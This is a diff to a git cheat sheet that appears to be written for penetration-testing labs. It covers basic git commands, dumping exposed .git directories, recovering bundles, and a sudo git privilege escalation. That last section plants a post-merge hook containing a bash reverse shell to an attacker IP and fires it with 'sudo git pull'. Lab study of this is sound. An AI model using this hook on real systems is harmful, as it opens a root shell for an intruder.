@@ -4,43 +4,42 @@ date: 2024-6-28
 tags: ["git", "git-dumper", "sudo", "privesc"]
 ---
 
----
 ### Basic Commands
 
 <div>
 
-```bash
+```console
 # Show status
 git status
 ```
 
-```bash
+```console
 # Reset the current branch to a previous commit
 git reset --hard
 ```
 
-```bash
+```console
 # Show information about files
 git ls-files --stage
 ```
 
-```bash
+```console
 # Show current branch
 git branch
 ```
 
-```bash
+```console
 # Show commits
 git log <BRANCH_NAME> --oneline
 ```
 
-```bash
+```console
 # Show diff, a and b are commit hash
 # a is the older commit
-git diff [a] [b]
+git diff <A_COMMIT_HASH> <B_COMMIT_HASH>
 ```
 
-```bash
+```console
 # Show commit
 git show <COMMIT_HASH>
 ```
@@ -59,8 +58,8 @@ git show <COMMIT_HASH>
 
 <div>
 
-```bash
-git-dumper http://10.10.11.10/.git result/
+```console
+git-dumper <TARGET>/.git result/
 ```
 
 </div>
@@ -72,12 +71,12 @@ git-dumper http://10.10.11.10/.git result/
 
 <div>
 
-```bash
+```console
 # List all bundles
 find . -type f -exec file {} \;
 ```
 
-```bash
+```console
 # Get bundle
 git clone -b master @hashed/ab/cd/<HASH>.bundle
 ```
@@ -94,17 +93,17 @@ git clone -b master @hashed/ab/cd/<HASH>.bundle
 
 <div>
 
-```bash
+```console
 # Copy target project
 cp -r /var/www/html/project .
 ```
 
-```bash
+```console
 # Create a malicious post-merge
-echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.10/1337 0>&1' > ./project/.git/hooks/post-merge
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1' > ./project/.git/hooks/post-merge
 ```
 
-```bash
+```console
 # Run
 sudo /usr/bin/git pull
 ```
